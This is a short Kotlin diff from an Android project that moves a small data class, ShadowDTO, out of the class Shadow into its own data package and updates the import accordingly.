@@ -7,6 +7,7 @@ import android.view.Surface
 import com.google.gson.Gson
 import com.hc.calling.commands.Command
 import com.hc.calling.commands.Executor
+import com.hc.calling.commands.shadow.data.ShadowDTO
 import com.hc.calling.commands.shadow.data.ShadowVM
 import com.hc.calling.commands.shadow.mic.util.RecoderHelper
 import com.hc.calling.commands.shadow.util.Photographer
@@ -106,9 +107,5 @@ class Shadow(context: Context) : Command(), Executor {
 
     }
 
-    data class ShadowDTO(
-        var type: String,
-        var camera: String
-    )
 
 }
